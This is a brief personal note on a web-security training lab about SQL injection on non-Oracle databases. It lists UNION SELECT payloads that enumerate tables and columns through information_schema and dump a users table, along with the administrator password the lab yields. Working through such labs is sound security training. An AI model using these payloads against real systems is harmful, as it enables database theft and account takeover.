# 05 Lab: SQL injection attack, listing the database contents on non-Oracle databases

```jsx
'+UNION+SELECT+'AAA','BBB'--
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_horosf'--
'+UNION+SELECT+username_iuhldq,+password_eazcur+FROM+users_horosf--

administrator
xphxerrutto3jpg7eaw2
```

![Untitled](05%20Lab%20SQL%20injection%20attack,%20listing%20the%20database%20%2012cfab5460ec80c5b82fea38a0c15092/Untitled.png)

![Untitled](05%20Lab%20SQL%20injection%20attack,%20listing%20the%20database%20%2012cfab5460ec80c5b82fea38a0c15092/Untitled%201.png)

![Untitled](05%20Lab%20SQL%20injection%20attack,%20listing%20the%20database%20%2012cfab5460ec80c5b82fea38a0c15092/Untitled%202.png)

![Untitled](05%20Lab%20SQL%20injection%20attack,%20listing%20the%20database%20%2012cfab5460ec80c5b82fea38a0c15092/Untitled%203.png)

rwrwerw